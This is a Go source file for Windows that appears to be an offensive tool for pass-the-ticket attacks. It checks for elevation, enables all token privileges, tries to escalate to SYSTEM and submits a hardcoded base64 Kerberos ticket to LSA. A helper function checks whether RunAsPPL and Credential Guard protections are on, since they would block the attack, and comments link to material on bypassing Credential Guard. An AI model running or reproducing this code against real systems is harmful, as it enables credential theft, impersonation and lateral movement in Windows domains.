//go:build windows

package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/fourcorelabs/wintoken"
	"github.com/unstppbl/gobeus/lsa"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var DEBUG bool

var ticket = "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"

func main() {
	DEBUG = true

	// CheckProtect()
	// return

	if len(os.Args) > 1 {
		time.Sleep(time.Second * 20)
	}
	lsa.DebugLSA = false
	// check privs
	curToken, err := wintoken.OpenProcessToken(int(windows.GetCurrentProcessId()), wintoken.TokenPrimary)
	if err != nil {
		panic(err)
	}
	defer curToken.Close()
	if !curToken.Token().IsElevated() {
		log.Fatal("[ERROR] Not running in an elevated context")
	}
	curToken.EnableAllPrivileges()
	privs, _ := curToken.GetPrivileges()
	for _, p := range privs {
		if p.Name == "SeImpersonatePrivilege" {
			fmt.Println("[+] We have SeImpersonatePrivilege")
		}
	}

	// attempt to escalate to system
	GetSystem()

	// get handle to lsa
	lsaHandle, err := lsa.GetLsaHAndle()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] LSA Handle:", &lsaHandle)
	// get the auth package
	authPack, err := lsa.LookupAuthPackage(lsaHandle)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Auth Package:", authPack)

	// lsa.DumpTickets(lsaHandle, authPack)
	if err := lsa.SubmitTicketFromBase64(lsaHandle, authPack, ticket); err != nil {
		log.Fatal(err)
	}
}

// RunAsPPL
// HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa.
// Set the value of the registry key to:
// "RunAsPPL"=dword:00000001 to configure the feature with a UEFI variable.
// "RunAsPPL"=dword:00000002 to configure the feature without a UEFI variable (only on Windows 11, 22H2).

// poc to patch wdigest.dll to bypass
// https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
// https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240

func CheckProtect() bool {
	// check for RunAsPPL
	regInfo, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	a, _, _ := regInfo.GetIntegerValue("RunAsPPL")
	if a != 0 {
		log.Fatal("[ERROR] RunAsPPL is enabled, this is not going to work!")
	}

	regInfo, err = registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	a, _, _ = regInfo.GetIntegerValue("LsaCfgFlags")
	if a != 0 {
		log.Fatal("[ERROR] Credential Guard is enabled, this is not going to work!")
	}

	return false
}
